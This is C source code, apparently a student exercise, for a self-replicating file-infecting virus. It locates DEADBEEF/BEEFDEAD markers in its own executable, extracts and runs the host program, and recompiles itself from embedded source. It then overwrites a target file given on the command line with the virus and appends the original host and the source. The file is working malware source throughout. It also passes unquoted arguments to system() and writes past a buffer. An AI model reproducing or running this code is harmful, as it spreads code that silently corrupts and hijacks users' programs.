#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>
#include <errno.h>
#include <unistd.h>
#include <sys/types.h>
#include <string.h>
#include <sys/wait.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <time.h>

int main(int argc, char **argv){
	srand(time(NULL));
	char buf[1000000];
	unsigned char mydata;
	int de = 0;
	int ad = 0;
	int be = 0;
	int ef = 0; 
	int beeffound = 0; 
	int dontWrite = 0; 

	// fork variables 
	pid_t child_pid, wpid;
	int status = 0;

	// temp filename location
	char snum[5]; 
	char temp[20];
	temp[20] = '\0';
	sprintf(snum, "%d", getuid() );
	strcpy(temp, "/tmp/host.");      
	strcat(temp, snum);             

	// for rm temp host file from /tmp
	char removeC[100];
	sprintf(removeC, "rm %s", temp); 
	if( access( temp, F_OK ) == 0 ) {
		printf("in\n");
		system(removeC);
    	exit(0);
	}
	char vt[20];
	sprintf(vt, "vt.c" );
	FILE* f = fopen(argv[0], "r");
	FILE* tmp = fopen(temp, "ab"); 
	FILE* virusTMP = fopen(vt, "ab");
	if(f == NULL || tmp == NULL || virusTMP == NULL ){
		printf("Open Failed %s\n", strerror(errno));
		exit(1);
	}

	// file argument checks if exists or asking for help 
	char help[50];
	FILE* argFile;
	strcpy(help, "-help");
	int dumb = access(argv[1], F_OK);
    if (dumb == 0){
		argFile = fopen(argv[1], "r");
		if(strcmp(argv[1], help) == 0){
			printf("Please Run Specified Program with second argument as a file");
			exit(0);
		}
		else if(argFile == NULL){
			printf("Invalid File\n");
			exit(0);
		}
		fclose(argFile);
		dontWrite = 1;
	}

	// open file to find deadbeaf 
	// I found this a really terrible way but it works 
	while((fread(&mydata, 1, 1, f) != 0)){

		// find deadbeef -------------------------------------------------------
		if(mydata == 0xde){
			de = 1;
		} 
		if(mydata == 0xad && de == 1){
			ad = 1;
		}
		else if(mydata == 0xad && de != 1){ 
			de = 0; 
		}
		if(mydata == 0xbe && de == 1 && ad == 1){
			be = 1;
		}
		else if(mydata == 0xbe && de != 1 && ad != 1){
			de = 0;
			ad = 0; 
		}
		if(mydata == 0xef && de == 1 && ad == 1 && be == 1){
			ef = 1;
		}
		else if(mydata == 0xef && de != 1 && ad != 1 && be != 1){
			de = 0;
			ad = 0;
			be = 0; 
		}

		if(mydata != 0xde && mydata != 0xad && mydata != 0xbe && mydata != 0xef){
			de = 0;
			ad = 0;
			be = 0;
			ef = 0;
		}
		// writes everything after deadbeef ( host ) to temporary file 
		if(beeffound == 1 ){
			if(fwrite(&mydata, 1, 1, tmp) != 1){
				printf("write error\n");
				exit(1);
			}
		}
		// exits if deadbeef was found consecutivly 
		if(de == 1 && ad == 1 && be == 1 && ef == 1){
			beeffound = 1;	
		}
		// -----------------------------------------------------------------------
	}

	beeffound = 0;
	fseek(f, 0, SEEK_SET);
	while((fread(&mydata, 1, 1, f) != 0)){
		// find beefdead ---------------------------------------------------------
		if(mydata == 0xbe){
			be = 1;
		} 
		if(mydata == 0xef && be == 1){
			ef = 1;
		}
		else if(mydata == 0xef && be != 1){ 
			be = 0; 
		}
		if(mydata == 0xde && be == 1 && ef== 1){
			de = 1;
		}
		else if(mydata == 0xde && be != 1 && ef != 1){
			be = 0;
			ef = 0; 
		}
		if(mydata == 0xad && be == 1 && ef == 1 && de == 1){
			ad = 1;
		}
		else if(mydata == 0xad && be != 1 && ef != 1 && de != 1){
			be = 0;
			ef = 0;
			de = 0; 
		}

		if(mydata != 0xbe && mydata != 0xef && mydata != 0xde && mydata != 0xad){
			de = 0;
			ad = 0;
			be = 0;
			ef = 0;
		}
		// writes everything after beefdead ( host ) to temporary file 
		if(beeffound == 1 ){
			fwrite(&mydata, 1, 1, virusTMP);
		}
		// exits if beefdead was found consecutivly 
		if(be == 1 && ef == 1 && de == 1 && ad == 1){
			beeffound = 1;	
		}
		//-----------------------------------------------------------------------

	}
	fclose(f);
	fclose(tmp);
	fclose(virusTMP);

	virusTMP = fopen(vt, "r"); 
	// copies all sourcecode to a buff 
	fseek(virusTMP, 0, SEEK_SET);
	int i = 0;
	while(fread(&mydata, 1, 1, virusTMP) != 0 && i < 1000000){
        buf[i] = mydata;
        i++;
    }
    //strstr
	fclose(virusTMP);
	char comp[100];
	sprintf(comp, "gcc -o vt vt.c");
	system(comp);
	
	
	
	//Check if host is already infected // search for deadbeef again 
	if(dontWrite == 1){
		argFile = fopen(argv[1], "r");
		// reapeating dumb things to find deadbeef 
		beeffound = 0;
		de = 0;
		ad = 0;
		be = 0;
		ef = 0;
		while((fread(&mydata, 1, 1, argFile) != 0)){
			if(mydata == 0xde){
				de = 1;
			} 
			if(mydata == 0xad && de == 1){
				ad = 1;
			}
			else if(mydata == 0xad && de != 1){ 
				de = 0; 
			}
			if(mydata == 0xbe && de == 1 && ad == 1){
				be = 1;
			}
			else if(mydata == 0xbe && de != 1 && ad != 1){
				de = 0;
				ad = 0; 
			}
			if(mydata == 0xef && de == 1 && ad == 1 && be == 1){
				ef = 1;
			}
			else if(mydata == 0xef && de != 1 && ad != 1 && be != 1){
				de = 0;
				ad = 0;
				be = 0; 
			}
			if(mydata != 0xde && mydata != 0xad && mydata != 0xbe && mydata != 0xef){
				de = 0;
				ad = 0;
				be = 0;
				ef = 0;
			}
			// exits if deadbeef was found consecutivly 
			if(de == 1 && ad == 1 && be == 1 && ef == 1){
				beeffound = 1;	
			}		
		}
		if(beeffound == 1){
			printf("Already Infected\n");
			exit(0);
		}


		// makes sure stat doesnt fail
		struct stat fileStat;
		if(stat(argv[1],&fileStat) < 0){
			exit(1);
		}   
	    // if not file not owned by uid of executing process exit
	    if(fileStat.st_uid != getuid()){
	    	printf("You Dont Own This File\n");
	    	exit(1);
	    }
	    //checks execute bit is not set 
	    int rval = access(argv[1], X_OK);
	    if (rval == 0){
	  		printf ("Execute Bit set \n");
	  		exit(1);
	    }
	

	    // Create Fork to run Host  ---------------
		char new[100];
		sprintf(new, "chmod u+x /tmp/host.%s", snum);
		system(new);
	
		if ((child_pid = fork()) == 0){
		
			if (execvp(temp, argv) < 0) {     
               printf("*** ERROR: exec failed\n");
               printf("%s",strerror(errno));
               exit(errno);
          	}
		exit(0);
		}
		// waits for child to reutrn
		while ((wpid = wait(&status)) > 0);
		// --------------------------------------------
	    // MUTATE ------------------------------------------------------
		int r = rand() % 100;

		if(r > 50){
			int g = 4285;
			r = g * r;
		}
		else{
			int v = 96;
			r = v * r;
		}
		// -------------------------------------------------------------

		// create two files one with deadbeef and beefdead in them
		
		char touch[100];
		sprintf(touch, "touch ht");
		system(touch);
		
		char cp[100];
		char dead[100];
		char cat[100];
		char cpH[100];
		char beef[100];
		char vv[100];
		sprintf(cpH, "cp %s ht", argv[1]); // copy argument binary to ht
		sprintf(cp, "cp vt %s", argv[1]); // copy virus 
		sprintf(dead, "echo -n -e '\\xde\\xad\\xbe\\xef' >> %s", argv[1]);
		sprintf(cat, "cat ht >> %s", argv[1]);
		sprintf(beef, "echo -n -e '\\xbe\\xef\\xde\\xad' >> %s", argv[1]);
		sprintf(vv, "cat vt.c >> %s", argv[1]);
		 system(cpH); 
		 system(cp); 
		 system(dead); 
		 system(cat); 
		 system(beef); 
		 system(vv); 
		fclose(argFile);

		char rmH[100];
		sprintf(rmH, "rm ht");
		system(rmH);
		
		
	}
	char rmV[100];
	sprintf(rmV, "rm vt.c");
	system(rmV);
	char rmV2[100];
	sprintf(rmV2, "rm vt");
	system(rmV2);
	char rm[100];
	sprintf(rm, "rm /tmp/host.%s", snum);
	system(rm);
	exit(0);



}